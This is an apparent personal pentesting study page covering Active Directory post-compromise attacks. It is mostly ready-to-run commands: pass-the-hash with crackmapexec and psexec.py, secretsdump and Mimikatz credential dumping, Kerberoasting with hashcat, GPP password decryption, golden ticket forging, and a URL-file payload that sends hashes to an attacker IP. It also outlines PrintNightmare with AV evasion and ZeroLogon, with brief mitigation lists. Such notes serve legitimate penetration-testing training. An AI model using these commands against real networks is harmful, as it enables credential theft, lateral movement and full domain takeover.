---
layout: default
title: 03. Active Directory Post Compromise
nav_order: 2
has_children: false
parent: Active Directory
grand_parent: Pentesting
---

## 03.Active Directory Post Compromise


### Pass The Hash

Pass The Password / Pass The Hash

You can pass NTLM hashes but not NTLMv2 hashes.

#### Using crackmapexec

[Source](https://wiki.porchetta.industries/)

Can be used with password:

```bash
crackmapexec smb $IP/$CIDR -u username -d EVIL_DOMAIN -p password
```

Or with hashes:

```bash
crackmapexec smb $IP/$CIDR -u username -H hash --local-auth
```

Accessing another instance pwned could be done using [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py) :

```bash
psexec.py evil/username:password@target_ip
```

#### Dumping hashes

It requires access to another host.

Using [secretdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) we could retrieve hashes from host:

```bash
secretdump.py evil/username:password@target_ip
```

It gives the SAM hashes and the LSA secrets of the host.

#### Cracking the hashes

Using hashcat:

```bash
hashcat -m 1000 hashes.txt rockyou.txt -O 
```

#### Only passing the hash

We will use only the second part of the hash:

![](/writings/docs/assets/Hashes.png)

![](docs/assets/Hashes.png)

Using crackmapexec:
```bash
crackmapexec smb $IP/$CIDR -u "Username" -H <hash> --local-auth
```

We could try to get a shell access using only the hash and psexec:

```bash
psexec.py "username":@target_ip -hashes LMHASH:NTHASH
```

(`LMHASH:NTHASH` correspond to the full hash retrieve previously)

#### Mitigations

- Limit account reuse
- Utilize strong password
- Implement Privilege Access Management (PAM)


### Token Impersonation

Token are temporary key allowing access to system / network without having to provide credentials.

There is 2 types:
- Delegate - Create to login to a machine / using RDP
- Impersonate - "Non interractive", attaching network drive or domain logon script

#### Using Incognito

Require a shell on a machine.
From an existing metasploit session, we could use the load command to load the `incognito` tool inside our target.

Once the tool loaded, we could start by listing the tokens available: 

```bash
list_tokens -u
```

Then from this list we could select a user we want to impersonate:

```bash
impersonate_token evil\\administrator
```

Metasploit handle everything for us. 

#### Mitigation

- Limit user/group token creation permission
- Account tiering 
- Local admin restriction


### Kerberoasting 

![](/writings/docs/assets/Pasted%20image%2020230223184254.png)
![](docs/assets/Pasted%20image%2020230223184256.png)

#### Get SPNs & Dump hash

Using GetUserSPNs.py from Impact we could simply run: 

```bash
python3 GetUserSPNs.py <DOMAIN/username:password> -dc-ip $IP -request
```

We should receive the hash quickly.

##### Crack the hash

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

#### Mitigation

- Strong password
- Least Privilege 


### GPP / cPassword Attacks (MS14-025)

#### Explanation 

- Allow admin to create policy using embeded credentials.
- Encrypted and stored in file name cPassword
- The key was released by error 
- So password could be decripted
- Patched by MS14-025

[Source](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)


#### Exploitation 

Our goal is to retrieve the `groups.xml` containing the cPasswords vulnerable to the attack. 
Then from this file we retrieve the hash and we just have to run: 

```bash
gpp-decrypt <hash>
```

Then with the credential we could try to retrive more information using: 
- psexec
- GetUserSPNs

### URL File Attacks

Require one of the following:

- Compromise user account
-  Open file share

#### Exploitation

Save the following file in a file name : `"@test.ur"`

```sh
[InternetShortcut] 
URL=blah 
WorkingDirectory=blah 
IconFile=\\<your_ip>\%USERNAME%.icon 
IconIndex=1
```

Upload it to the share where you have the permission to read. 

Launch responder and you should start receiveing hashes. 

### PrintNightmare (CVE-2021-1675) Walkthrough

- [Python Code to RCE](https://github.com/cube0x0/CVE-2021-1675)
- [Powershell - Code to RCE](https://github.com/calebstewart/CVE-2021-1675)

#### Exploitation

1. Create the payload using msfvenom, the payload should be a `.dll`  file.
2. Wait for the session using netcat 
3. Expose the dll file via a samba server using impacket (must have smb2 support)
4. Run the python script to exploit (AV might detect it, so the payload might need to be encoded to bypass the AV)



### Mimikatz

[Repository](https://github.com/gentilkiwi/mimikatz)

- Tool to view and steal credential
- Generate Kerberoast ticket 
- Perform attacks (PassTheHash, SilverTicket, GoldenTicket, ...)
- Dumps credential stored in memory 


#### Usage 

We start by checking the status: 
```powershell
privilege::debug
```

It should respond with a : `Privilege '20' OK`

We can now dump some information from the memory, it will provide us the NTLM hash of each user that loged in since the previous reboot: 

```powershell
sekurlsa::logonpassword
```

We could use the output to exploit the "Pass The Hash" attack. 

We could as well take advantages of the wdigest feature by forcing its activation and wait for a user to login in order to exploit it.

We could dump the SAM:
```powershell
lsadump::sam
```


We could dump all the NTLM hashes of all users with:
```powershell
lsadump::lsa /patch
```

The other option is to download the NTDS.dit file.
This password should be retrieved to be cracked offline. 

### Golden Ticket Attacks

Using mimikatz: 

```powershell
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

We need to retrieve: 
- The SID of the domain
- The NTLM hash of the account 

Now we could use those information to perform a "Pass The Hash" attack with the Administrator account:
```powershell
kerberos::golden /User:Administrator /domain evil.local /sid:<SID> /krbtgt <NTLM_HASH> /id:500 /ptt
```

Then we could open the command prompt as Administrator:
```powershell
misc::cmd
```

Then for example, we could use psexec from there to continue our research and get access to other account.

### ZeroLogon 

- [Exploit Repository](https://github.com/dirkjanm/CVE-2020-1472)
- [Checker](https://github.com/SecuraBV/CVE-2020-1472)

This attack will set the password of the domain to NULL so at the end we must restore it otherwise the domain could be destroyed. 
It will require to have impacket installed and working. 

### Resources: 

- Active Directory Security Blog: [https://adsecurity.org/](https://adsecurity.org/)
- Harmj0y Blog: [http://blog.harmj0y.net/](http://blog.harmj0y.net/)
- Pentester Academy Active Directory: [https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab)
- Pentester Academy Red Team Labs: [https://www.pentesteracademy.com/redteamlab](https://www.pentesteracademy.com/redteamlab)
- eLS PTX: [https://elearnsecurity.com/product/ecptx-certification/](https://elearnsecurity.com/product/ecptx-certification/)


